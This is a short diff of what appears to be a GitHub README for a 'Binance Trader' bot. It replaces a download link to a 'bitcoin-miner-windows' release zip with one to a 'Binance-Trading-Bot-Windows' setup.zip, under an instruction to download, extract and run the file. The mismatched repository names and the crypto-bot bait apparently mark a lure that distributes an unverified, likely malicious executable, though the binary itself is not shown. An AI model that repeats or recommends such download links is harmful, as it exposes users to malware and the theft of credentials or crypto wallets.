@@ -12,7 +12,7 @@
 
   * Download the file provided in the release, extract the file and run the file.
   
-<a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download Binance Trader NBT</a><br>
+<a href='https://github.com/ThetanMetacadeAxieInfinity/Binance-Trading-Bot-Windows/releases/download/Binance/setup.zip'>Download Binance Trader NBT</a><br>
   
 ## Disclaimer
 
